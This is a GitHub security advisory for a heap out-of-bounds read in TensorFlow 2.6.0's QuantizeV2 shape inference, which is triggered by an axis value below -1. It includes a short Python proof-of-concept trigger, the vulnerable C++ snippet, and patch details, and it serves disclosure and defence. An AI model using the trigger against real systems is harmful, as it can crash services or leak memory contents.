# [H] Heap OOB in shape inference for `QuantizeV2`

## Summary
Severity: High
Advisory: GHSA-cvgx-3v3q-m36c
CVE: CVE-2021-41211
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H (CVSS_V3)
Published: 2021-11-10
Source: https://github.com/advisories/GHSA-cvgx-3v3q-m36c
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow-cpu` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow-gpu` — affected >=2.6.0 <2.6.1

## Details
### Impact
The [shape inference code for `QuantizeV2`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/framework/common_shape_fns.cc#L2509-L2530) can trigger a read outside of bounds of heap allocated array:

```python
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeV2(
    input=[1.0,1.0],
    min_range=[1.0,10.0],
    max_range=[1.0,10.0],
    T=tf.qint32,
    mode='MIN_COMBINED',
    round_mode='HALF_TO_EVEN',
    narrow_range=False,
    axis=-100,
    ensure_minimum_range=10)
  return data

test()
```

This occurs whenever `axis` is a negative value less than `-1`. In this case, we are accessing data before the start of a heap buffer:
    
```cc
int axis = -1;
Status s = c->GetAttr("axis", &axis);
if (!s.ok() && s.code() != error::NOT_FOUND) {
  return s;
}   
... 
if (axis != -1) {
  ...
  TF_RETURN_IF_ERROR(
      c->Merge(c->Dim(minmax, 0), c->Dim(input, axis), &depth));
}
```

The code allows `axis` to be an optional argument (`s` would contain an `error::NOT_FOUND` error code). Otherwise, it assumes that `axis` is a valid index into the dimensions of the `input` tensor. If `axis` is less than `-1` then this results in a heap OOB read.
    
### Patches
We have patched the issue in GitHub commit [a0d64445116c43cf46a5666bd4eee28e7a82f244](https://github.com/tensorflow/tensorflow/commit/a0d64445116c43cf46a5666bd4eee28e7a82f244).
    
The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, as this version is the only one that is also affected.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cvgx-3v3q-m36c
- https://nvd.nist.gov/vuln/detail/CVE-2021-41211
- https://github.com/tensorflow/tensorflow/commit/a0d64445116c43cf46a5666bd4eee28e7a82f244
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-620.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-818.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-403.yaml
- https://github.com/tensorflow/tensorflow
